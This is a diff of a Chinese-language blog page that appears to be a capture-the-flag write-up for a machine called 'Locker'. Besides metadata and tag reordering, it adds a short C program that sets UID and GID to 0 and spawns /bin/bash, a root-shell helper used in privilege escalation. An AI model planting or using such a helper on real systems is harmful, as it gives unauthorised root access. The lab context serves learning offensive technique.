@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://example.com/images/Locker/root3.png">
 <meta property="og:image" content="http://example.com/images/Locker/shell2.png">
 <meta property="article:published_time" content="2025-06-12T15:12:27.489Z">
-<meta property="article:modified_time" content="2025-06-12T15:57:50.318Z">
+<meta property="article:modified_time" content="2025-06-18T06:20:59.163Z">
 <meta property="article:author" content="Starrui">
 <meta property="article:tag" content="Sulogin">
 <meta name="twitter:card" content="summary">
@@ -93,7 +93,7 @@
    				 总文章数 17
 		</nav>
 		<nav>
-				总字数 <span class="post-count">6.9k</span>
+				总字数 <span class="post-count">7k</span>
 		</nav>
 		<nav class="header-nav">
 			<div class="social">
@@ -197,7 +197,7 @@
         
       </header>
       <div align="center" class="post-count">
-       字数：631字 | 预计阅读时长：2分钟
+       字数：740字 | 预计阅读时长：2分钟
      </div>
     
     <div class="article-entry" itemprop="articleBody">
@@ -244,6 +244,9 @@
 </tr>
 </tbody></table>
 <h3 id="拿root"><a href="#拿root" class="headerlink" title="拿root"></a>拿root</h3><p>我们用老版本的C语言编写一个设置系统命令的代码</p>
+<p>C语言代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;   // 基础输入输出库</span><br><span class="line">#include&lt;stdlib.h&gt;  // 提供 system() 等函数，用于执行系统命令</span><br><span class="line">#include&lt;unistd.h&gt;  // 提供 setuid()、setgid() 等系统调用</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    setuid(0);     // 将进程的有效用户 ID 设置为 0（root 用户的 UID）</span><br><span class="line">    setgid(0);     // 将进程的有效组 ID 设置为 0（root 组的 GID）</span><br><span class="line">    system(&quot;/bin/bash&quot;);  // 执行 /bin/bash，启动一个新的 Shell</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../images/Locker/root3.png" alt="nmap" title="NMAP扫描"></p>
 <p>为什么要建立C文件</p>
 <ul>
@@ -564,14 +567,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ssh2john</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">base64</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Agent</a>
               </li>
              
@@ -580,7 +575,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">smb</a>
+                <a href="javascript:void(0)" class="js-tag color4">ssh2john</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">base64</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -592,6 +591,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">smb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -600,15 +603,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">分号截断</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">logic</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">monitor</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">分号截断</a>
               </li>
              
               <li class="article-tag-list-item">
